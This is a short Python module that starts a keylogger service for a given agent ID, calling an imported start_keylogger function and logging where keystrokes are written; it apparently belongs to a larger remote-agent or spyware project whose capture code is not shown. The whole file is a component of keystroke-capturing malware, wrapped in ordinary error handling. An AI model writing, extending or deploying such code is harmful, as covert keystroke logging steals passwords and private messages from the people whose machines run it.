from config.settings import KEYLOG_FILE
from actions.keylogger import start_keylogger
from logger import logger

def start_keylogger_service(agent_id):
    """Start the key logger service in a background thread."""
    try:
        if agent_id is None:
            logger.error("No agent ID found. Key logger will not start.")
            return
        
        listener = start_keylogger(agent_id)

        if listener is None:
            logger.error("Key logger disabled.")
        else:
            logger.info(f"Key logger running → {KEYLOG_FILE}")

    except Exception as e:
        logger.error(f"Key logger error: {e}")